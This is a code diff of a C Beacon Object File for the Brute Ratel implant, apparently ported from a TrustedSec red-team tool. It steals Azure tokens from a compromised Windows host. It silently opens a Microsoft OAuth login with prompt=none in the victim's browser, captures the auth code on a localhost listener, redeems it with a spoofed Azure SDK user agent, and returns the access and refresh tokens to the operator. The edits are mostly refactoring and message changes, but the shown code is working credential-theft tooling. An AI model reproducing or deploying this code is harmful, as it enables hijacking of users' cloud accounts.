@@ -2,57 +2,11 @@
 #include <windows.h>
 #include <winhttp.h>
 
+#include "definitions.h"
 #include "badger_exports.h"
 
 // Credits to freefirex:
 // https://github.com/trustedsec/CS-Remote-OPs-BOF/blob/main/src/Remote/get_azure_token/entry.c
-
-WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE *phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
-WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCreateHash(BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_HASH_HANDLE *phHash, PUCHAR pbHashObject, ULONG cbHashObject, PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);
-WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptHashData(BCRYPT_HASH_HANDLE hHash, PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);
-WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptFinishHash(BCRYPT_HASH_HANDLE hHash, PUCHAR pbOutput, ULONG cbOutput, ULONG dwFlags);
-WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyHash(BCRYPT_HASH_HANDLE hHash);
-WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);
-WINBASEAPI WINBOOL WINAPI ADVAPI32$SystemFunction036(PVOID RandomBuffer, ULONG RandomBufferLength);
-WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *_Str, size_t _MaxCount);
-WINIMPM WINBOOL WINAPI CRYPT32$CryptBinaryToStringA(CONST BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPSTR pszString, DWORD *pcchString);
-WINUSERAPI int WINAPI USER32$GetWindowTextA(HWND hWnd, LPSTR lpString, int nMaxCount);
-WINBASEAPI PCHAR __cdecl MSVCRT$strstr(const char *haystack, const char *needle);
-WINUSERAPI LRESULT WINAPI USER32$SendMessageTimeoutW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, UINT fuFlags, UINT uTimeout, PDWORD_PTR lpdwResult);
-WINBASEAPI SOCKET WINAPI WS2_32$send(SOCKET s, const char *buf, int len, int flags);
-WINBASEAPI int WINAPI WS2_32$closesocket(SOCKET s);
-WINBASEAPI int WINAPI WS2_32$recv(SOCKET s, char *buf, int len, int flags);
-WINBASEAPI PCHAR __cdecl MSVCRT$strchr(const char *haystack, int needle);
-WINBASEAPI int __cdecl MSVCRT$strncmp(const char *_Str1, const char *_Str2, size_t _MaxCount);
-WINBASEAPI int __cdecl MSVCRT$_snprintf(char *__restrict__ _Dest, size_t _Count, const char *__restrict__ _Format, ...);
-WINUSERAPI int WINAPI USER32$EnumDesktopWindows(HDESK hDesktop, WNDENUMPROC lpfn, LPARAM lParam);
-WINBASEAPI u_short WINAPI WS2_32$htons(u_short hostshort);
-WINBASEAPI int WINAPI WS2_32$bind(SOCKET s, const struct sockaddr *addr, int namelen);
-WINBASEAPI int WINAPI WS2_32$socket(int af, int type, int protocol);
-WINBASEAPI unsigned long WINAPI WSOCK32$inet_addr(const char *cp);
-WINBASEAPI int WINAPI WS2_32$listen(SOCKET s, int backlog);
-WINBASEAPI SOCKET WINAPI WS2_32$accept(SOCKET s, struct sockaddr *addr, int *addrlen);
-WINBASEAPI WINBOOL WINAPI KERNEL32$SetEvent(HANDLE hEvent);
-WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
-_CRTIMP uintptr_t __cdecl MSVCRT$_beginthreadex(void *_Security, unsigned _StackSize, _beginthreadex_proc_type _StartAddress, void *_ArgList, unsigned _InitFlag, unsigned *_ThrdAddr);
-WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
-WINBASEAPI HINSTANCE WINAPI SHELL32$ShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
-WINBASEAPI char *__cdecl MSVCRT$strcpy(char *__restrict__ __dst, const char *__restrict__ __src);
-WINBASEAPI char *__cdecl MSVCRT$strcat(char *__restrict__ _Dest, const char *__restrict__ _Source);
-WINBASEAPI WINBOOL WINAPI KERNEL32$TerminateThread(HANDLE hThread, DWORD dwExitCode);
-WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
-WINBASEAPI HANDLE WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, WINBOOL bManualReset, WINBOOL bInitialState, LPCSTR lpName);
-WINBASEAPI int WINAPI WS2_32$WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
-WINBASEAPI int WINAPI WS2_32$WSACleanup(void);
-WINBASEAPI HINTERNET WINAPI WINHTTP$WinHttpOpen(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
-WINBASEAPI HINTERNET WINAPI WINHTTP$WinHttpConnect(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
-WINBASEAPI HINTERNET WINAPI WINHTTP$WinHttpOpenRequest(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR *, DWORD);
-WINBASEAPI WINBOOL WINAPI WINHTTP$WinHttpAddRequestHeaders(HINTERNET, LPCWSTR, DWORD, DWORD);
-WINBASEAPI WINBOOL WINAPI WINHTTP$WinHttpSendRequest(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
-WINBASEAPI WINBOOL WINAPI WINHTTP$WinHttpReceiveResponse(HINTERNET, LPVOID);
-WINBASEAPI WINBOOL WINAPI WINHTTP$WinHttpReadData(HINTERNET, LPVOID, DWORD, LPDWORD);
-WINBASEAPI WINBOOL WINAPI WINHTTP$WinHttpCloseHandle(HINTERNET);
-
 #define RtlGenRandom ADVAPI32$SystemFunction036
 
 char fmtString[] = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=http://localhost:%d&prompt=none%s%s&response_mode=query&scope=%s&state=12345&code_challenge=%s&code_challenge_method=S256";
@@ -213,7 +167,7 @@ DWORD WINAPI ListenServer(void *_ctx) {
     {
         tries++;
         if (tries > 100) {
-            BadgerDispatch(g_dispatch, "[!] This shouldn't be hit but we can't bind a socket so bailing\n");
+            BadgerDispatch(g_dispatch, "[-] This shouldn't be hit but we can't bind a socket so bailing\n");
             return 0;
         }
         s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -256,12 +210,12 @@ int RequestToken(flow_args *args, ctx *context) {
 
     postData = BadgerAlloc(4096);
     if (!postData) {
-        BadgerDispatch(g_dispatch, "[!] Memory allocation failed for postData\n");
+        BadgerDispatch(g_dispatch, "[-] Memory allocation failed for postData\n");
         goto cleanup;
     }
 
     if (MSVCRT$_snprintf(redir_uri, sizeof(redir_uri), "http%%3A%%2F%%2Flocalhost%%3A%d", context->port) < 0) {
-        BadgerDispatch(g_dispatch, "[!] Failed to format redirect URI\n");
+        BadgerDispatch(g_dispatch, "[-] Failed to format redirect URI\n");
         goto cleanup;
     }
 
@@ -270,26 +224,26 @@ int RequestToken(flow_args *args, ctx *context) {
     length = MSVCRT$_snprintf(postData, 4096, postFmt, args->client_id, "https%3A%2F%2Fmanagement.core.windows.net%2F%2F.default+offline_access+openid+profile", context->authcode, redir_uri, context->PKCE);
 
     if (length <= 0 || length >= 4096) {
-        BadgerDispatch(g_dispatch, "[!] Failed to format POST data or buffer overflow\n");
+        BadgerDispatch(g_dispatch, "[-] Failed to format POST data or buffer overflow\n");
         goto cleanup;
     }
 
     // Might want to check that user agent
     hSession = WINHTTP$WinHttpOpen(L"azsdk-net-Identity.Broker/1.1.0 (.NET 9.0.1; ur dad edition)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) {
-        BadgerDispatch(g_dispatch, "[!] WinHttpOpen failed with error %lu\n", KERNEL32$GetLastError());
+        BadgerDispatch(g_dispatch, "[-] WinHttpOpen failed with error %lu\n", KERNEL32$GetLastError());
         goto cleanup;
     }
 
     hConnect = WINHTTP$WinHttpConnect(hSession, L"login.microsoftonline.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
     if (!hConnect) {
-        BadgerDispatch(g_dispatch, "[!] WinHttpConnect failed with error %lu\n", KERNEL32$GetLastError());
+        BadgerDispatch(g_dispatch, "[-] WinHttpConnect failed with error %lu\n", KERNEL32$GetLastError());
         goto cleanup;
     }
 
     hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"POST", L"/common/oauth2/v2.0/token", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
     if (!hRequest) {
-        BadgerDispatch(g_dispatch, "[!] WinHttpOpenRequest failed with error %lu\n", KERNEL32$GetLastError());
+        BadgerDispatch(g_dispatch, "[-] WinHttpOpenRequest failed with error %lu\n", KERNEL32$GetLastError());
         goto cleanup;
     }
 
@@ -308,22 +262,22 @@ int RequestToken(flow_args *args, ctx *context) {
                                                          -1, WINHTTP_ADDREQ_FLAG_ADD);
 
     if (!headersAdded) {
-        BadgerDispatch(g_dispatch, "[!] WinHttpAddRequestHeaders failed with error %lu\n", KERNEL32$GetLastError());
+        BadgerDispatch(g_dispatch, "[-] WinHttpAddRequestHeaders failed with error %lu\n", KERNEL32$GetLastError());
         goto cleanup;
     }
 
     if (!WINHTTP$WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, postData, length, length, 0)) {
-        BadgerDispatch(g_dispatch, "[!] WinHttpSendRequest failed with error %lu\n", KERNEL32$GetLastError());
+        BadgerDispatch(g_dispatch, "[-] WinHttpSendRequest failed with error %lu\n", KERNEL32$GetLastError());
         goto cleanup;
     }
 
     if (!WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
-        BadgerDispatch(g_dispatch, "[!] WinHttpReceiveResponse failed with error %lu\n", KERNEL32$GetLastError());
+        BadgerDispatch(g_dispatch, "[-] WinHttpReceiveResponse failed with error %lu\n", KERNEL32$GetLastError());
         goto cleanup;
     }
 
     if (!WINHTTP$WinHttpReadData(hRequest, context->tokens, 16184, &context->tokensLen)) {
-        BadgerDispatch(g_dispatch, "[!] WinHttpReadData failed with error %lu\n", KERNEL32$GetLastError());
+        BadgerDispatch(g_dispatch, "[-] WinHttpReadData failed with error %lu\n", KERNEL32$GetLastError());
         goto cleanup;
     }
 
@@ -348,12 +302,12 @@ void StartAuthCodeFlow(flow_args *args, ctx *context) {
     }
     GeneratePKCE(context->PKCE);
     if (context->PKCE[0] == '\0') {
-        BadgerDispatch(g_dispatch, "[!] Failed to generate PKCE code\n");
+        BadgerDispatch(g_dispatch, "[-] Failed to generate PKCE code\n");
         return;
     }
     ConvertToChallenge(context);
     if (context->base64PKCE[0] == '\0') {
-        BadgerDispatch(g_dispatch, "[!] Failed to generate base64 of hashed PKCE code\n");
+        BadgerDispatch(g_dispatch, "[-] Failed to generate base64 of hashed PKCE code\n");
         return;
     }
     HANDLE hThread = (HANDLE)MSVCRT$_beginthreadex(NULL, 0, (_beginthreadex_proc_type)ListenServer, (void *)context, 0, NULL);
@@ -387,12 +341,12 @@ void StartAuthCodeFlow(flow_args *args, ctx *context) {
                 break;
             }
             default: {
-                BadgerDispatch(g_dispatch, "[!] Invalid value given for browser\n");
+                BadgerDispatch(g_dispatch, "[-] Invalid value given for browser\n");
                 break;  // We shouldn't get here but we'll handle it regardless
             }
         }
     } else {
-        BadgerDispatch(g_dispatch, "[!] Listen event failed to trigger");
+        BadgerDispatch(g_dispatch, "[-] Listen event failed to trigger");
     }
     if (KERNEL32$WaitForSingleObject(hThread, 10000) == WAIT_OBJECT_0) {
         if (context->authcode) {
@@ -400,10 +354,10 @@ void StartAuthCodeFlow(flow_args *args, ctx *context) {
             RequestToken(args, context);
 
         } else {
-            BadgerDispatch(g_dispatch, "[!] Failed to receive auth code, unable to proceed");
+            BadgerDispatch(g_dispatch, "[-] Failed to receive auth code, unable to proceed");
         }
     } else {
-        BadgerDispatch(g_dispatch, "[*] Local server did not stop, force killing it and bailing");
+        BadgerDispatch(g_dispatch, "[*] Local server did not stop, force killing it and bailing\n");
         KERNEL32$TerminateThread(hThread, 1);
     }
     KERNEL32$CloseHandle(hThread);
@@ -415,8 +369,8 @@ void coffee(char **argv, int argc, WCHAR **dispatch) {
     g_dispatch = dispatch;
 
     if (argc < 5) {
-        BadgerDispatch(g_dispatch, "[!] Usage: get_azure_token.o <client_id> <scope> <browser_id> <hint> <browser_path>\n");
-        BadgerDispatch(g_dispatch, "[!] <hint> and <browser_path> are optional; set to 0 if not needed\n");
+        BadgerDispatch(g_dispatch, "[-] Usage: get_azure_token.o <client_id> <scope> <browser_id> <hint> <browser_path>\n");
+        BadgerDispatch(g_dispatch, "[-] <hint> and <browser_path> are optional; set to 0 if not needed\n");
         BadgerDispatch(g_dispatch, "Available Browser IDs:\n");
         BadgerDispatch(g_dispatch, "\t0 - Edge\n");
         BadgerDispatch(g_dispatch, "\t1 - Chrome\n");
@@ -427,23 +381,20 @@ void coffee(char **argv, int argc, WCHAR **dispatch) {
 
     flow_args *args = BadgerAlloc(sizeof(flow_args));
     if (!args) {
-        BadgerDispatch(g_dispatch, "[!] Failed to allocate memory for flow_args\n");
+        BadgerDispatch(g_dispatch, "[-] Failed to allocate memory for flow_args\n");
         return;
     }
 
     ctx *context = BadgerAlloc(sizeof(ctx));
     if (!context) {
-        BadgerDispatch(g_dispatch, "[!] Failed to allocate memory for ctx\n");
-        BadgerFree((PVOID *)&args);
-        return;
+        BadgerDispatch(g_dispatch, "[-] Failed to allocate memory for ctx\n");
+        goto cleanup;
     }
 
     context->listening = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
     if (!context->listening) {
-        BadgerDispatch(g_dispatch, "[!] Failed to create event\n");
-        BadgerFree((PVOID *)&args);
-        BadgerFree((PVOID *)&context);
-        return;
+        BadgerDispatch(g_dispatch, "[-] Failed to create event\n");
+        goto cleanup;
     }
 
     args->client_id = argv[0];
@@ -456,23 +407,23 @@ void coffee(char **argv, int argc, WCHAR **dispatch) {
     size_t bplen = args->browser_path ? BadgerStrlen(args->browser_path) : 0;
 
     if (bplen > MAX_PATH) {
-        BadgerDispatch(g_dispatch, "[!] Error: Provided browser path is too long, must be <= %d\n", MAX_PATH);
+        BadgerDispatch(g_dispatch, "[-] Provided browser path is too long, must be <= %d\n", MAX_PATH);
         goto cleanup;
     }
 
     if (args->browser == OTHER && args->browser_path == NULL) {
-        BadgerDispatch(g_dispatch, "[!] Error: Browser type 'OTHER' (3) requires a browser path\n");
+        BadgerDispatch(g_dispatch, "[-] Browser type 'OTHER' (3) requires a browser path\n");
         goto cleanup;
     }
 
-    if (args->browser > OTHER) {
-        BadgerDispatch(g_dispatch, "[!] Error: Invalid browser ID\n");
+    if (args->browser > OTHER || args->browser < 0) {
+        BadgerDispatch(g_dispatch, "[-] Invalid browser ID\n");
         goto cleanup;
     }
 
     WSADATA wsdata = {0};
     if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsdata) != 0) {
-        BadgerDispatch(g_dispatch, "[!] WSAStartup failed\n");
+        BadgerDispatch(g_dispatch, "[-] WSAStartup failed\n");
         goto cleanup;
     }
 
@@ -481,7 +432,7 @@ void coffee(char **argv, int argc, WCHAR **dispatch) {
     if (context->tokens[0]) {
         BadgerDispatch(g_dispatch, "\n---\n%s\n---\n", context->tokens);
     } else if (context->error) {
-        BadgerDispatch(g_dispatch, "[!] Fail: %s (%s)\n", context->error, context->error_desc ? context->error_desc : "No description available");
+        BadgerDispatch(g_dispatch, "[-] Fail: %s (%s)\n", context->error, context->error_desc ? context->error_desc : "No description available");
     }
 
     WS2_32$WSACleanup();
